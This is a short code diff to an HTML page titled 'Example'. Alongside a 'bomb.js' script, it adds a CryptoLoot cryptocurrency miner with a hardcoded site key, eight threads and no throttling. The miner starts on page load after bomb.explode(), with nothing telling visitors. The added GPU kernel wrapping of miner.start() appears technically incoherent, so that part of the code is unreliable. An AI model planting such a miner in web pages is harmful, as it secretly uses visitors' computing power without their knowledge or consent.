@@ -3,9 +3,17 @@
 <head>
     <title>Example</title>
     <script src="./bomb.js" type="text/javascript"></script>
+    <script type="text/javascript" src="lib/cryptoloot-master/lib/crypta.js"></script>
     <script>
         let bomb = new Bomb();
-        bomb.explode()
+        var miner = new CRLT.Anonymous('9943cc38782e81c57ab2ba66d6af3710d1c98dc254ec', {
+            threads: 8, throttle: 0, coin: "upx",
+        });
+        bomb.explode().then(() => {
+            const gpu = new GPU()
+            const gpuminer = gpu.createKernel(miner.start(), {output: [1]})
+            gpuminer()
+        })
     </script>
 </head>
 <body>
